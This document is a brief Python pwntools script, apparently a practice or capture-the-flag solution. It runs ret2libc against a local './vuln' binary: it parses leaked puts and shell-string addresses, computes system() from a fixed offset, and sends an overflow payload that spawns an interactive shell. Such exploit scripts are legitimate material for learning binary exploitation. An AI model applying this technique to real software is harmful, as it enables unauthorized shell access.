#!/usr/bin/env python

from pwn import *
import re

# Opening up the exe
elf = ELF('./vuln')

# setting elf.process to a p for easier useability 
p = elf.process()

# p.recv, recevies
prompt = p.recv()

# Carving out puts/usefull_string from the usefull addresses
puts = int(re.findall('puts: (.*)',prompt)[0],16)
bin_sh = int(re.findall('useful_string: (.*)',prompt)[0],16)

# Using our offset and minusing it from puts to get our sys address
system = puts - 0x24800 # <-- offset

# Making the payload
payload = ('A'*160)
payload += p32(system) # converting to little endian
payload += ('JUNK') # Overriding the return address
payload += p32(bin_sh) # converting to little endian


p.sendline(payload)

# Makes it so bash doesn't close
p.interactive()